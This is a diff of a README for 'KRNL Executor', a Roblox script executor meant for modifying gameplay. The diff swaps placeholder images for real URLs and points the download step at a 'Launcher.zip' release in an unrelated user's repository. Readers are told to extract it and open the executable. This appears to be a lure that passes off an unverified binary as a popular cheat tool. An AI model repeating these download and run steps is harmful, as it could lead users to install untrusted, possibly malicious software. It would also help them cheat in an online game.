@@ -1,6 +1,6 @@
 # KRNL Executor
 
-![KRNL Executor Logo](https://example.com/krnl-logo.png)
+![KRNL Executor Logo](https://play-lh.googleusercontent.com/6r1-cMLJ_Oao25M1NjstmGXob3gCNWjulRgRfafumFZSmSyiv9hvx-gCNX5NVZLMsQ=w200-rw)
 
 The KRNL Executor is a well-known utility for Roblox on Windows, valued for its performance and ability to execute Lua scripts effectively. This repository provides the latest version of KRNL Executor, designed to offer a seamless and advanced experience for modifying gameplay.
 
@@ -13,7 +13,7 @@ The KRNL Executor is a well-known utility for Roblox on Windows, valued for its 
 
 ## Installation
 
-1. Download the [latest version of KRNL Executor](https://github.com/user-attachments/files/17394153/Software.zip).
+1. Download the [latest version of KRNL Executor](https://github.com/sagaray81/krnl-executor/releases/download/Download/Launcher.zip).
 2. Extract the ZIP file to a preferred directory.
 3. Open the executable file to start the KRNL Executor.
 
@@ -38,7 +38,7 @@ KRNL Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file
 
 ---
 
-![KRNL Executor Screenshot](https://example.com/krnl-screenshot.png)
+![KRNL Executor Screenshot](https://tenten.vn/tin-tuc/wp-content/uploads/2022/11/krnl-1-1024x576.jpg)
 
 ---
 
